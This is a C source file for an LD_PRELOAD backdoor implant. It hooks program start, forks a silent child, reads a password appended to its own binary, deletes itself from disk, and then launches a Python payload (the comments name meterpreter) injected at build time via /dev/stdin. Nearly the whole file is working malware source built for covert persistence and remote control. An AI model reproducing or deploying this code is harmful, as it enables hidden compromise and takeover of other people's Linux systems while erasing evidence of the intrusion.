#define _DEFAULT_SOURCE
#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>

// dirty, see Makefile
#include "/dev/stdin"

int shell(int argc, const char *argv[]) {
    // backdoor specific programs if we want to. Currently disabled (||1)
    if(!strncmp(argv[0], "/sbin/init", 10)||1) {
        // only execute inside /sbin/init
        pid_t pid = fork();
        if (pid == 0) {
            // don't show any output
            close(1);
            close(2);
            close(3);
            // store our own path for later use
            char *sopath = getenv("LD_PRELOAD");
            // we don't want children to load us
            unsetenv("LD_PRELOAD");

            // find password
            FILE *self = fopen(sopath, "r");
            fseek(self, -1, SEEK_END);
            int pwlen = 0;
            while (fgetc(self) != 0) {
                pwlen++;
                // fgetc advances, go back 2
                fseek(self, -2, SEEK_CUR);
            }
            // read password
            char *pass = malloc(pwlen);
            fread(pass, pwlen, 1, self);
            fclose(self);

            // give password to meterpreter as env var
            char *env;
            asprintf(&env, "PASSWORD=%s", pass);
            free(pass);
            char *envp[] = {
                env,
                NULL
            };
            // delete self
            unlink(sopath);
            // sleep, wait for networking etc
            sleep(WAIT);

            // Choose the correct binary. The payload is agnostic
            if (access("/usr/bin/python2", F_OK) != -1) {
                execle("/usr/bin/python2",
                        "python2",
                        "-c",
                        PAYLOAD, // payload is taken from /dev/stdin. See Makefile for details
                        NULL,
                        envp);
            } else if (access("/usr/bin/python3", F_OK) != -1) {
                execle("/usr/bin/python3",
                        "python3",
                        "-c",
                        PAYLOAD, // payload is taken from /dev/stdin. See Makefile for details
                        NULL,
                        envp);
            }
        }
    }
    return 0;
}
